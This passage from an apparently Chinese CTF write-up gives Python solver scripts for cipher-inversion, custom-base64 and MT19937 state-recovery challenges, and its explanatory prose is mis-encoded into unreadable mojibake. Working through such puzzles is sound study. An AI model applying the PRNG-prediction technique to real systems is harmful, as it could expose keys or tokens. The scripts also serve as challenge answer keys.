class="number">24</span>) | (Key[<span class="number">9</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">10</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">11</span>])</span><br><span class="line">    d = limit((Key[<span class="number">12</span>] &lt;&lt; <span class="number">24</span>) | (Key[<span class="number">13</span>] &lt;&lt; <span class="number">16</span>) | (Key[<span class="number">14</span>] &lt;&lt; <span class="number">8</span>) | Key[<span class="number">15</span>])</span><br><span class="line">    <span class="keyword">return</span> (a,b,c,d)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#y = limit((Data[0] &lt;&lt; 24) | (Data[1] &lt;&lt; 16) | (Data[2] &lt;&lt; 8) | Data[3])</span></span><br><span class="line">    <span class="comment">#z = limit((Data[4] &lt;&lt; 24) | (Data[5] &lt;&lt; 16) | (Data[6] &lt;&lt; 8) | Data[7])</span></span><br><span class="line"></span><br><span class="line">(a,b,c,d)=init(key)</span><br><span class="line">ans = <span class="number">0x9d98a72f5c82c26680a65</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"flag&#123;0123456789bcde-_&#125;\x00"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ans <span class="keyword">in</span> [<span class="number">0xcf4add0cf5469a49d19c</span>,</span><br><span class="line"><span class="number">0xcccd38faa373af5059b5f</span>,</span><br><span class="line"><span class="number">0xad0e355d4d8b1cc9771d1</span>,</span><br><span class="line"><span class="number">0x703ccca78d36e770d0613</span>,</span><br><span class="line"><span class="number">0x54e05275b03e2cdedc053</span>]:</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">            y = ans &gt;&gt; <span class="number">52</span><span class="comment">#å–y</span></span><br><span class="line">            mix = ans &amp; (<span class="number">2</span>**<span class="number">52</span><span class="number">-1</span>)<span class="comment">#å‰©ä¸‹çš„ä¸ºä¸ç¡®å®šzå’Œpadæ··åˆ</span></span><br><span class="line">            pads_true = mix &gt;&gt; <span class="number">32</span><span class="comment">#æ‹¿åˆ°padçš„æœ‰æ•ˆçš„20ä½</span></span><br><span class="line">            source_pad = (h&lt;&lt;<span class="number">27</span>)| (pads_true&lt;&lt;<span class="number">7</span>)| l<span class="comment">#çˆ†ç ´pad</span></span><br><span class="line">            z = limit(mix ^ (source_pad&lt;&lt;<span class="number">25</span>))<span class="comment">#æ ¹æ®çŒœçš„padï¼Œç„¶åmixä¸­padå’Œzçš„æ··åˆéƒ¨åˆ†ï¼Œç¡®å®šz</span></span><br><span class="line">            <span class="keyword">for</span> round <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                pads = limit(source_pad*(<span class="number">32</span>-round))<span class="comment">#æ ¹æ®encodeæ¥ç”¨pads</span></span><br><span class="line">                z = limit( z - ((y*<span class="number">16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;<span class="number">5</span>) + d)))<span class="comment">#åŠ å¯†å‡½æ•°åä¸€ä¸‹</span></span><br><span class="line">                y = limit( y - ((z*<span class="number">16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;<span class="number">5</span>) + b)))</span><br><span class="line">            flag = (y&lt;&lt;<span class="number">32</span>)+z</span><br><span class="line">            <span class="comment">#print flag</span></span><br><span class="line">            <span class="keyword">if</span> check(long_to_bytes(flag)):<span class="comment">#æ ¹æ®flagçš„å¯èƒ½å­—ç¬¦æ¥åˆ¤æ–­å’¯</span></span><br><span class="line">                print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure><h1 id="ç™½è™ç»„"><a href="#ç™½è™ç»„" class="headerlink" title="ç™½è™ç»„"></a>ç™½è™ç»„</h1><h2 id="b64"><a href="#b64" class="headerlink" title="b64"></a>b64</h2><p>æ¢è¡¨base64ï¼Œå°†ç»™å‡ºå¯¹åº”å…³ç³»è®°ä¸‹æ¥ï¼Œå‘ç°flagå¯†æ–‡ä¸­[â€˜Eâ€™, â€˜Gâ€™, â€˜Iâ€™, â€˜sâ€™, â€˜Xâ€™, â€˜zâ€™]ï¼Œè¿™å…­ä¸ªå­—ç¬¦æ²¡æœ‰æ˜ å°„å…³ç³»ã€‚</p><p>ç„¶åæœ‰[â€˜+â€™, â€˜/â€˜, â€˜1â€™, â€˜5â€™, â€˜7â€™, â€˜6â€™, â€˜9â€™, â€˜8â€™, â€˜Aâ€™, â€˜Câ€™, â€˜Hâ€™, â€˜Kâ€™, â€˜Jâ€™, â€˜Pâ€™, â€˜Râ€™, â€˜Vâ€™, â€˜eâ€™, â€˜fâ€™, â€˜nâ€™, â€˜uâ€™, â€˜wâ€™, â€˜vâ€™] è¿™ä¹ˆå¤šä½å­—ç¬¦ä¹Ÿæ²¡æœ‰è¢«æ˜ å°„ã€‚</p><p>æ‰€ä»¥çˆ†ç ´è¿™ä¸¤ä¸ªåˆ—è¡¨ä¸­çš„æ˜ å°„å…³ç³»</p><p>ç„¶åæ ¹æ®flagçš„æ ¼å¼ï¼Œuuidï¼Œæ¥åˆ¤æ–­ç»“æœã€‚</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8-*-</span><br><span class="line">from base64 import *</span><br><span class="line">from string import *</span><br><span class="line"></span><br><span class="line">def check(s):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i not <span class="keyword">in</span> <span class="string">"flag&#123;-1234567890abcdef&#125;"</span>:</span><br><span class="line">            <span class="keyword">return</span> False</span><br><span class="line">    <span class="keyword">return</span> True</span><br><span class="line"></span><br><span class="line">flag = 'uLdAuO8duojAFLEKjIgdpfGeZoELjJp9kSieuIsAjJ/LpSXDuCGduouz'</span><br><span class="line">a='pTjMwJ9WiQHfvC+eFCFKTBpWQtmgjopgqtmPjfKfjSmdFLpeFf/Aj2ud3tN7u2+enC9+nLN8kgdWo29ZnCrOFCDdFCrOFoF='</span><br><span class="line">b='YXNobGtqIUBzajEyMjMlXiYqU2Q0NTY0c2Q4NzlzNWQxMmYyMzFhNDZxd2prZDEySjtESmpsO0xqTDtLSjg3MjkxMjg3MTM='</span><br><span class="line"><span class="keyword">alpha</span> = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789abcdefABCDEF+/'</span><br><span class="line">FLAG=''</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"fail words"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> a:</span><br><span class="line"></span><br><span class="line">        index = a.<span class="built_in">index</span>(i)</span><br><span class="line">        FLAG+=b[index]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        FLAG+='!'</span><br><span class="line">        <span class="keyword">print</span> i,</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nFLAG cipher"</span>       </span><br><span class="line"><span class="keyword">print</span> FLAG</span><br><span class="line">#'ZmxhZ3sxZTNhMm!lN!0xYz!yLT!mNGYtOWIyZ!!hNGFmYW!kZj!xZTZ!'</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"alternative words"</span></span><br><span class="line">aw=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">alpha</span>:</span><br><span class="line">    <span class="keyword">if</span> i not <span class="keyword">in</span> b:</span><br><span class="line">        aw += <span class="built_in">i</span></span><br><span class="line"><span class="keyword">print</span> aw</span><br><span class="line"></span><br><span class="line">'@#$%^&amp;'</span><br><span class="line"><span class="keyword">table</span> = 'ACHJKPRVefnuvw156789efAC+/'</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for z"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">if</span> b64decode(<span class="string">"ZTZ"</span>+i)[-1] == '&#125;':</span><br><span class="line">        FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"ZTZ!"</span>,<span class="string">"ZTZ9"</span>)</span><br><span class="line">        <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>)</span><br><span class="line">        #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for G"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">if</span> check(b64decode(<span class="string">"Zj"</span>+i+<span class="string">"x"</span>)) and check(b64decode(<span class="string">"Yz"</span>+i+<span class="string">"y"</span>)):</span><br><span class="line">        #<span class="keyword">print</span> b64decode(<span class="string">"Zj"</span>+i+<span class="string">"x"</span>)</span><br><span class="line">        FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"Zj!x"</span>,<span class="string">"Zj"</span>+i+<span class="string">"x"</span>).<span class="keyword">replace</span>(<span class="string">"Yz!y"</span>,<span class="string">"Yz"</span>+i+<span class="string">"y"</span>)</span><br><span class="line">        <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>)</span><br><span class="line">        #<span class="keyword">print</span> <span class="built_in">i</span></span><br><span class="line">        #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for I and s"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> check(b64decode(<span class="string">"N"</span>+i+<span class="string">"0x"</span>)) and check(b64decode(<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)):</span><br><span class="line">            #<span class="keyword">print</span> b64decode(<span class="string">"N"</span>+i+<span class="string">"0x"</span>),b64decode(<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)</span><br><span class="line">            FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"N!0x"</span>,<span class="string">"N"</span>+i+<span class="string">"0x"</span>).<span class="keyword">replace</span>(<span class="string">"Z!!h"</span>,<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)</span><br><span class="line">            <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>).<span class="keyword">replace</span>(j,<span class="string">""</span>)</span><br><span class="line">            #<span class="keyword">print</span> i,<span class="built_in">j</span></span><br><span class="line">            #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for X and E"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">        <span class="keyword">if</span> j == i:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s = b64decode(FLAG.<span class="keyword">replace</span>(<span class="string">"Mm!l"</span>,<span class="string">"Mm"</span>+i+<span class="string">"l"</span>).<span class="keyword">replace</span>(<span class="string">"LT!m"</span>,<span class="string">"LT"</span>+i+<span class="string">"m"</span>).<span class="keyword">replace</span>(<span class="string">"YW!k"</span>,<span class="string">"YW"</span>+j+'k'))</span><br><span class="line">        <span class="keyword">if</span> check(s):</span><br><span class="line">            <span class="keyword">print</span> <span class="built_in">s</span></span><br></pre></td></tr></table></figure><h2 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h2><p>å•Šï¼Œä¸€é“æ†¨æ†¨é¢˜ï¼Œmt19937éƒ½å¿«ç»™ç©çƒ‚äº†ã€‚è€Œä¸”è¿™è¿˜æ˜¯æœ€æœ€ç®€å•çš„é¢„æµ‹ï¼Œç›´æ¥å¥—ä¸Šç°æˆçš„å·¥å…·å°±èƒ½è§£keyã€‚è‡³äºåé¢çš„ä¸€ä¸ªåªç»™äº†åŠ å¯†å‡½æ•°æ²¡ç»™è§£å¯†å‡½æ•°ç”¨çš„feistelçš„å¯†ç ï¼Œå¯èƒ½æ˜¯DESå§ï¼Œæ²¡ç»†çœ‹ã€‚ç›´æ¥æŠŠå¯†é’¥æµåè¿‡æ¥ï¼Œç”¨ä»–ç»™çš„åŠ å¯†å‡½æ•°æ¥è§£å¯†å°±å¥½äº†ã€‚</p><p>MT19937é¢„æµ‹key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Recover</span>:</span></span><br><span class="line">    <span class="string">"""Reverses the Mersenne Twister based on 624 observed outputs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The internal state of a Mersenne Twister can be recovered by observing</span></span><br><span class="line"><span class="string">    624 generated outputs of it. However, if those are not directly</span></span><br><span class="line"><span class="string">    observed following a twist, another output is required to restore the</span></span><br><span class="line"><span class="string">    internal index.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftRight</span><span class="params">(self, x, shift)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ res &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftLeft</span><span class="params">(self, x, shift, mask)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">untemper</span><span class="params">(self, v)</span>:</span></span><br><span class="line">        <span class="string">""" Reverses the tempering which is applied to outputs of MT19937 """</span></span><br><span class="line"></span><br><span class="line">        v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(self, outputs, forward=True)</span>:</span></span><br><span class="line">        <span class="string">"""Reverses the Mersenne Twister based on 624 observed values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            outputs (List[int]): list of &gt;= 624 observed outputs from the PRNG.</span></span><br><span class="line"><span class="string">                However, &gt;= 625 outputs are required to correctly recover</span></span><br><span class="line"><span class="string">                the internal index.</span></span><br><span class="line"><span class="string">            forward (bool): Forward internal state until all observed outputs</span></span><br><span class="line"><span class="string">                are generated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Returns a random.Random() object.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        result_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> len(outputs) &gt;= <span class="number">624</span>       <span class="comment"># need at least 624 values</span></span><br><span class="line"></span><br><span class="line">        ivals = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">            <span class="comment"># We have additional outputs and can correctly</span></span><br><span class="line">            <span class="comment"># recover the internal index by bruteforce</span></span><br><span class="line">            challenge = outputs[<span class="number">624</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">                state = (<span class="number">3</span>, tuple(ivals+[i]), <span class="literal">None</span>)</span><br><span class="line">                r = random.Random()</span><br><span class="line">                r.setstate(state)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                    result_state = state</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># With only 624 outputs we assume they were the first observed 624</span></span><br><span class="line">            <span class="comment"># outputs after a twist --&gt;  we set the internal index to 624.</span></span><br><span class="line">            result_state = (<span class="number">3</span>, tuple(ivals+[<span class="number">624</span>]), <span class="literal">None</span>)</span><br><span class="line">        rand = random.Random()</span><br><span class="line">        rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(outputs)):</span><br><span class="line">                <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_PythonMT19937Recover</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Just a testcase to ensure correctness"""</span></span><br><span class="line">    mtb = MT19937Recover()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#r1 = random.Random(0x31337)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># just some discarded random numbers to move internal state forward</span></span><br><span class="line">    <span class="comment">#[r1.getrandbits(32) for _ in range(1234)]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the actual leak of 1000 values</span></span><br><span class="line">    <span class="comment">#n = [r1.getrandbits(32) for _ in range(1000)]</span></span><br><span class="line">    <span class="keyword">with</span> open (<span class="string">"random"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        nn= f.read().split(<span class="string">"\n"</span>)</span><br><span class="line">        print(nn)</span><br><span class="line">        n = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> nn[:<span class="number">-1</span>]]</span><br><span class="line">    r2 = mtb.go(n)</span><br><span class="line">    <span class="keyword">print</span> (r2.getrandbits(<span class="number">32</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#assert r1.getrandbits(32) == r2.getrandbits(32)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_PythonMT19937Recover()</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°keyï¼Œæ”¹åŠ å¯†å‡½æ•°ï¼Œè§£å¯†å¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"flag&#123;************************************&#125;"</span></span><br><span class="line"></span><br><span class="line">hexadecimalcontrast = &#123;</span><br><span class="line">    <span class="string">'0'</span>: <span class="string">'0000'</span>,</span><br><span class="line">    <span class="string">'1'</span>: <span class="string">'0001'</span>,</span><br><span class="line">    <span class="string">'2'</span>: <span class="string">'0010'</span>,</span><br><span class="line">    <span class="string">'3'</span>: <span class="string">'0011'</span>,</span><br><span class="line">    <span class="string">'4'</span>: <span class="string">'0100'</span>,</span><br><span class="line">    <span class="string">'5'</span>: <span class="string">'0101'</span>,</span><br><span class="line">    <span class="string">'6'</span>: <span 